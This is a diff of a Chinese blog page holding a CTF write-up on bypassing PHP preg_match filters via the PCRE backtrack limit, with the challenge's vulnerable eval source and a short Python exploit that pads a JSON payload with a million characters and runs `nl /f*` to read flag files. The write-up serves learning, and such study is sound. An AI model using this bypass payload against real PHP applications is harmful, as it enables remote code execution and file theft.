@@ -16,12 +16,12 @@
   <meta name="author" content="orange">
   <meta name="keywords" content="">
   
-    <meta name="description" content="刷题碰到了这种题目，记录一下知识点。 首先可以拜读一下p神的文章，还是很有收获的。 文章 原理然后我也简要的说一下吧。 常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是  DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。  NFA：从起始状态开始，一个字符">
+    <meta name="description" content="刷题碰到了这种题目，记录一下知识点。 首先可以拜读一下p神的文章，还是很有收获的。 文章  原理 然后我也简要的说一下吧。 常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是   DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。   NFA：从起始状态开始，">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP利用PCRE回溯次数限制绕过">
 <meta property="og:url" content="https://0ran9ewww.github.io/2024/05/14/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="0raN9e的笔记">
-<meta property="og:description" content="刷题碰到了这种题目，记录一下知识点。 首先可以拜读一下p神的文章，还是很有收获的。 文章 原理然后我也简要的说一下吧。 常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是  DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。  NFA：从起始状态开始，一个字符">
+<meta property="og:description" content="刷题碰到了这种题目，记录一下知识点。 首先可以拜读一下p神的文章，还是很有收获的。 文章  原理 然后我也简要的说一下吧。 常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是   DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。   NFA：从起始状态开始，">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-05-14T12:10:00.000Z">
 <meta property="article:modified_time" content="2024-05-14T12:17:28.000Z">
@@ -114,7 +114,11 @@
 
 
   
-<meta name="generator" content="Hexo 7.1.1"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
 
 
 <body>
@@ -264,7 +268,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          612 字
+          604 字
         
       </span>
     
@@ -336,25 +340,30 @@
                 <p>刷题碰到了这种题目，记录一下知识点。</p>
 <p>首先可以拜读一下p神的文章，还是很有收获的。</p>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=2#reply-list">文章</a></p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>然后我也简要的说一下吧。</p>
+<h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2>
+<p>然后我也简要的说一下吧。</p>
 <p>常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是</p>
 <ul>
-<li><p>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。</p>
+<li>
+<p>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。</p>
 </li>
-<li><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p>
+<li>
+<p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p>
 </li>
 </ul>
-<p>就以p神举的例子，我们正则&lt;?.*[(&#96;;?&gt;].*,然后输入&lt;?php phpinfo();&#x2F;&#x2F;aaaaa这个内容</p>
-<p>由于有.*这个正则，可以匹配任何字符，进行贪婪模式，匹配到.*时，会把php phpinfo();&#x2F;&#x2F;aaaaa所有进行匹配，但是应该不对后面应该还有一个字符[(&#96;;?&gt;]（这是一个字符集匹配其中任意一个，所有我们会进行回溯，吐出a,最终直道吐出；然后可以进行匹配。这个结果满足正则表达式的要求，于是不再回溯。最后的.*匹配的&#x2F;&#x2F;aaaaa，完成正则。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>preg_match本身回身回溯超过1000000会返回false绕过，我们可以构造脚本进行绕过。</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>是先看到的题目，然后才开始找知识点的。<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">NISACTF 2022middlerce</a>。</p>
+<p>就以p神举的例子，我们正则&lt;?.*[(`;?&gt;].*,然后输入&lt;?php phpinfo();//aaaaa这个内容</p>
+<p>由于有.*这个正则，可以匹配任何字符，进行贪婪模式，匹配到.*时，会把php phpinfo();//aaaaa所有进行匹配，但是应该不对后面应该还有一个字符[(`;?&gt;]（这是一个字符集匹配其中任意一个，所有我们会进行回溯，吐出a,最终直道吐出；然后可以进行匹配。这个结果满足正则表达式的要求，于是不再回溯。最后的.*匹配的//aaaaa，完成正则。</p>
+<h2 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h2>
+<p>preg_match本身回身回溯超过1000000会返回false绕过，我们可以构造脚本进行绕过。</p>
+<h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2>
+<p>是先看到的题目，然后才开始找知识点的。<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">NISACTF 2022middlerce</a>。</p>
 <p>先看源码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>include &quot;check.php&quot;;<br>if (isset($_REQUEST[&#x27;letter&#x27;]))&#123;<br>    $txw4ever = $_REQUEST[&#x27;letter&#x27;];<br>    if (preg_match(&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;,$txw4ever))&#123;<br>        die(&quot;再加把油喔&quot;);<br>    &#125;<br>    else&#123;<br>        $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;];<br>        checkdata($command);<br>        @eval($command);<br>    &#125;<br>&#125;<br>else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
-
 <p>我们只分析这篇的知识点，和上面讲的差不多，cmd绕过后eval进行读取</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>payload=<span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;@&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br><span class="hljs-comment">#传的letter,构造payload里面的内容，?&gt;是绕过checkdata,然后js选择cmd里的内容执行代码输出</span><br>res = requests.post(<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28304/&quot;</span>, data=&#123;<span class="hljs-string">&quot;letter&quot;</span>:payload&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure>
-
-<h2 id="感受："><a href="#感受：" class="headerlink" title="感受："></a>感受：</h2><p>小白学到知识还是感受良多的，之后如果遇到类似的题目也会继续加在这里。</p>
+<h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp:</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>payload=<span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;@&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br><span class="hljs-comment">#传的letter,构造payload里面的内容，?&gt;是绕过checkdata,然后js选择cmd里的内容执行代码输出</span><br>res = requests.post(<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28304/&quot;</span>, data=&#123;<span class="hljs-string">&quot;letter&quot;</span>:payload&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure>
+<h2 id="感受"><a class="markdownIt-Anchor" href="#感受"></a> 感受：</h2>
+<p>小白学到知识还是感受良多的，之后如果遇到类似的题目也会继续加在这里。</p>
 
                 
               </div>
@@ -765,6 +774,22 @@
   <noscript>
     <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
   </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>Copy
 </body>
 </html>
 
